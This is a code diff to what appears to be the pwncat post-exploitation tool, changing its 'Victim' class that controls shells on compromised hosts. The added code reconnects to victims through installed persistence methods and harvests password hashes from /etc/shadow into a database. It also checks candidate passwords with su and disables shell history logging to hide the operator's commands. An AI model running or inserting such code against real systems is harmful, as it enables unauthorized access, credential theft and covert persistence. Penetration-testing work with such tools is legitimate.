@@ -96,9 +96,10 @@ class Victim:
         # Configuration storage for this victim
         self.config = Config(self)
         # Current user input state
-        self._state = State.COMMAND
+        self._state = None
         # Saved remote terminal state (for transition to/from raw mode)
-        self.saved_term_state = None
+        self.saved_term_state = util.enter_raw_mode()
+        util.restore_terminal(self.saved_term_state, new_line=False)
         # Prompt and prompt prefix
         self.remote_prefix = "\\[\\033[01;31m\\](remote)\\[\\033[00m\\]"
         self.remote_prompt = (
@@ -124,6 +125,7 @@ class Victim:
         self.has_prefix = False
         # Parser for local command input
         self.command_parser: CommandParser = CommandParser()
+        self.command_parser.setup_prompt()
         # Victim system tamper tracker
         self.tamper: TamperManager = TamperManager()
         # The client socket
@@ -141,6 +143,48 @@ class Victim:
         # The host object as seen by the database
         self.host: pwncat.db.Host = None
 
+    def reconnect(self, hostid: str):
+        """
+        Reconnect to the host identified by the provided host hash. The host hash can be
+        retrieved from the ``sysinfo`` command of a running ``pwncat`` session or from
+        the ``host`` table in the database directly. This hash uniquely identifies a host
+        even if it's IP changes from your perspective. It is constructed from host-specific
+        information probed from the last time ``pwncat`` connected to it.
+        
+        :param hostid: the unique host hash generated from the last pwncat session
+        """
+
+        # Create the database engine, and then create the schema
+        # if needed.
+        self.engine = create_engine(self.config["db"], echo=False)
+        pwncat.db.Base.metadata.create_all(self.engine)
+
+        # Create the session_maker and default session
+        self.session_maker = sessionmaker(bind=self.engine)
+        self.session = self.session_maker()
+
+        # Load this host from the database
+        self.host = self.session.query(pwncat.db.Host).filter_by(hash=hostid).first()
+        if self.host is None:
+            raise persist.PersistenceError("{hostid}: invalid host hash")
+
+        for username, method in self.persist.installed:
+            try:
+                util.progress(
+                    f"attempting host reconnection via {method.format(username)}"
+                )
+                sock = method.reconnect(username)
+                self.connect(sock)
+                return
+            except persist.PersistenceError:
+                continue
+
+        raise persist.PersistenceError("no working persistence methods found")
+
+    @property
+    def connected(self):
+        return self.client is not None
+
     def connect(self, client: socket.SocketType):
         """
         Set up the remote client. This socket is assumed to be connected to some form
@@ -155,13 +199,14 @@ class Victim:
 
         # Create the database engine, and then create the schema
         # if needed.
-        self.engine = create_engine(self.config["db"], echo=False)
-        pwncat.db.Base.metadata.create_all(self.engine)
+        if self.engine is None:
+            self.engine = create_engine(self.config["db"], echo=False)
+            pwncat.db.Base.metadata.create_all(self.engine)
 
-        # Create the session_maker and default session
-        if self.session is None:
-            self.session_maker = sessionmaker(bind=self.engine)
-            self.session = self.session_maker()
+            # Create the session_maker and default session
+            if self.session is None:
+                self.session_maker = sessionmaker(bind=self.engine)
+                self.session = self.session_maker()
 
         # Initialize the socket connection
         self.client = client
@@ -170,12 +215,12 @@ class Victim:
         # This is changed in some cases by individual functions, but
         # it will always be returned to one second. This doesn't apply
         # when in raw mode, since we do asynchronous IO in that case.
-        self.client.settimeout(1)
+        # self.client.settimeout(1)
 
         # Attempt to grab the remote hostname and mac address
         hostname_path = self.run("which hostname").strip().decode("utf-8")
         if hostname_path.startswith("/"):
-            hostname = self.run("hostname -f")
+            hostname = self.run("hostname -f").strip()
         else:
             util.warn("hostname command not found; using peer address")
             hostname = client.getpeername().encode("utf-8")
@@ -211,6 +256,9 @@ class Victim:
         # Lookup the remote host in our database. If it's not there, create an entry
         self.host = self.session.query(pwncat.db.Host).filter_by(hash=host_hash).first()
         if self.host is None:
+            util.info(
+                f"new host with hash {host_hash} (hostname: {hostname}, mac: {mac})"
+            )
             # Create a new host entry
             self.host = pwncat.db.Host(hash=host_hash)
             # Probe for system information
@@ -219,6 +267,9 @@ class Victim:
             self.session.add(self.host)
             # Commit what we know
             self.session.commit()
+
+        # Save the remote host IP address
+        self.host.ip = self.client.getpeername()[0]
 
         # We initialize this here, because it needs the database to initialize
         # the history objects
@@ -230,9 +281,11 @@ class Victim:
 
         util.info("setting terminal prompt", overlay=True)
         self.run("unset PROMPT_COMMAND")
-        self.run(f'export PS1="{self.remote_prefix} {self.remote_prompt}"')
+        self.run(f"export PS1='{self.remote_prefix} {self.remote_prompt}'")
 
         self.shell = self.run("ps -o command -p $$ | tail -n 1").decode("utf-8").strip()
+        if self.shell.startswith("-"):
+            self.shell = self.shell[1:]
         self.shell = self.which(self.shell.split(" ")[0])
         util.info(f"running in {Fore.BLUE}{self.shell}{Fore.RESET}")
 
@@ -265,7 +318,7 @@ class Victim:
         # This stuff won't carry through to the PTY, so we need to reset it again.
         util.info("setting terminal prompt", overlay=True)
         self.run("unset PROMPT_COMMAND")
-        self.run(f'export PS1="{self.remote_prefix} {self.remote_prompt}"')
+        self.run(f"export PS1='{self.remote_prefix} {self.remote_prompt}'")
 
         # Make sure HISTFILE is unset in this PTY (it resets when a pty is
         # opened)
@@ -1252,16 +1305,22 @@ class Victim:
             name, description, target, runas, enable, user
         )
 
-    def su(self, user: str, password: str = None):
+    def su(self, user: str, password: str = None, check: bool = False):
         """
         Attempt to switch users to the specified user. If you are currently UID=0,
         the password is ignored. Otherwise, the password will first be checked
-        and then utilized to switch the active user of your shell.
+        and then utilized to switch the active user of your shell. If ``check``
+        is specified, do not actually switch users. Only check that the given
+        password is correct.
         
         Raises PermissionError if the password is incorrect or the ``su`` fails.
         
         :param user: the user to switch to
+        :type user: str
         :param password: the password for the specified user or None if currently UID=0
+        :type password: str
+        :param check: if true, only check the password; do not escalate
+        :type check: bool
         """
 
         current_user = self.id
@@ -1285,6 +1344,10 @@ class Victim:
 
             if b"failure" in result.lower() or b"good" not in result.lower():
                 raise PermissionError(f"{user}: invalid password")
+
+        # We don't need to escalate, only checking the password
+        if check:
+            return
 
         # Switch users
         self.env(["su", user], wait=False)
@@ -1354,7 +1417,7 @@ class Victim:
         :return: bytes
         """
         output = b""
-        old_blocking = self.client.getblocking()
+        # old_blocking = self.client.getblocking()
         old_timeout = self.client.gettimeout()
         self.client.settimeout(1)
 
@@ -1382,12 +1445,13 @@ class Victim:
         self.run("reset", wait=False)
         self.has_cr = True
         self.has_echo = True
+        self.run("unset HISTFILE; export HISTCONTROL=ignorespace")
         self.run("unset PROMPT_COMMAND")
         self.run("unalias -a")
         self.run(f"export PS1='{self.remote_prefix} {self.remote_prompt}'")
         self.run(f"tput rmam")
 
-    def recvuntil(self, needle: bytes, flags=0, interp=False):
+    def recvuntil(self, needle: bytes, interp=False):
         """
         Receive data from the socket until the specified string of bytes is
         found. There is no timeout features, so you should be 100% sure these
@@ -1406,7 +1470,7 @@ class Victim:
         result = b""
         while not result.endswith(needle):
             try:
-                data = self.client.recv(1, flags)
+                data = self.client.recv(1)
                 # Bash sends some **WEIRD** shit and wraps it in backspace
                 # characters for some reason. When asked, we interpret the
                 # backspace characters so the response is what we expect.
@@ -1499,6 +1563,8 @@ class Victim:
         
         """
 
+        ident = self.id
+
         # Clear the user cache
         with self.open("/etc/passwd", "r") as filp:
             for line in filp:
@@ -1512,7 +1578,7 @@ class Victim:
                     .first()
                 )
                 if user is None:
-                    user = pwncat.db.User(id=int(line[2]))
+                    user = pwncat.db.User(host_id=self.host.id, id=int(line[2]))
                 user.name = line[0]
                 user.id = int(line[2])
                 user.gid = int(line[3])
@@ -1535,7 +1601,9 @@ class Victim:
                     .first()
                 )
                 if group is None:
-                    group = pwncat.db.Group(name=line[0], id=int(line[2]))
+                    group = pwncat.db.Group(
+                        name=line[0], id=int(line[2]), host_id=self.host.id
+                    )
 
                 group.name = line[0]
                 group.id = int(line[2])
@@ -1551,6 +1619,29 @@ class Victim:
 
                 if group not in self.host.groups:
                     self.host.groups.append(group)
+
+        if ident["euid"]["id"] == 0:
+            with self.open("/etc/shadow", "r") as filp:
+                for line in filp:
+                    entries = line.strip().split(":")
+
+                    if len(entries) < 2:
+                        # This doesn't make sense. Malformed /etc/shadow
+                        continue
+
+                    user = (
+                        self.session.query(pwncat.db.User)
+                        .filter_by(host_id=self.host.id, name=entries[0])
+                        .first()
+                    )
+                    if user is None:
+                        # There's a shadow entry for a non-existent user...
+                        continue
+
+                    if entries[1] != "!!" and entries[1] != "*":
+                        user.hash = entries[1]
+                    else:
+                        user.hash = None
 
         return self.users
 
